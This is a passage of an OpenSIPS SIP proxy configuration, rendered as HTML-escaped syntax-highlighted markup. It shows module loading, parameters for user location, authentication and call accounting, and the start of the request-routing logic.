&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sl.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rr.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;maxfwd.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;usrloc.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;registrar.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;textops.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mi_fifo.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Uncomment this if you want digest authentication
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# db_mysql.so must be loaded !
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#loadmodule &amp;#34;auth.so&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#loadmodule &amp;#34;auth_db.so&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# ----------------- setting module-specific parameters ---------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# -- mi_fifo params --
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;modparam(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mi_fifo&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fifo_name&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/tmp/opensips_fifo&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# -- usrloc params --
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#modparam(&amp;#34;usrloc&amp;#34;, &amp;#34;db_mode&amp;#34;,   0)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Uncomment this if you want to use SQL database 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# for persistent storage and comment the previous line
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;modparam(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;usrloc&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_mode&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;2)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# -- auth params --
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Uncomment if you are using auth module
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#modparam(&amp;#34;auth_db&amp;#34;, &amp;#34;calculate_ha1&amp;#34;, yes)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# If you set &amp;#34;calculate_ha1&amp;#34; parameter to yes (which true in this config), 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# uncomment also the following parameter)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#modparam(&amp;#34;auth_db&amp;#34;, &amp;#34;password_column&amp;#34;, &amp;#34;password&amp;#34;)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# -- acc params --
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;modparam(&amp;#34;acc&amp;#34;, &amp;#34;db_url&amp;#34;, &amp;#34;mysql&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;//opensips:opensipsrw@localhost/opensips&amp;#34;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# flag to record to db
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;modparam(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_flag&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;1)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;modparam(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_missed_flag&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;2)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# flag to log to syslog
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;modparam(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log_flag&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;1)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;modparam(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log_missed_flag&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;2)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# use extra accounting to record caller and callee username/domain
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# - take them from From URI and R-URI
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;modparam(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log_extra&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;src_user=$fU;src_domain=$fd;dst_user=$rU;dst_domain=$rd&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;modparam(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_extra&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;src_user=$fU;src_domain=$fd;dst_user=$rU;dst_domain=$rd&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# -------------------------  request routing logic -------------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# main routing logic
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;route{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# initial sanity checks -- messages with
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# max_forwards==0, or excessively long requests&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!mf_process_maxfwd_header&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;10&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;483&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Too Many Hops&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# subsequent messages withing a dialog should take the&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# path determined by record-routing&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;loose_route&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# mark routing logic in request&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		append_hf&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;P-hint: rr-enforced\r\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;BYE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# account BYE for STOP record&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			setflag&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# we record-route all messages -- to make sure that&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# subsequent messages will go through our proxy; that&amp;#39;s&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# particularly good if upstream and downstream entities&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# use different transport protocol&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;REGISTER&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		record_route&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# account all calls&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;INVITE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# set accounting on for INVITE (success or missed call)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		setflag&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		setflag&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!is_myself&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$rd&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# mark routing logic in request&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		append_hf&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;P-hint: outbound\r\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# if you have some interdomain connections via TLS&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;#if($ru=~&amp;#34;@tls_domain1.net&amp;#34;) {&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;#	t_relay(&amp;#34;tls:domain1.net&amp;#34;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;#	exit;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;#} else if($ru=~&amp;#34;@tls_domain2.net&amp;#34;) {&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;#	t_relay(&amp;#34;tls:domain2.net&amp;#34;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;#	exit;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;#}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# if the request is for other domain use UsrLoc&lt;/span&gt;
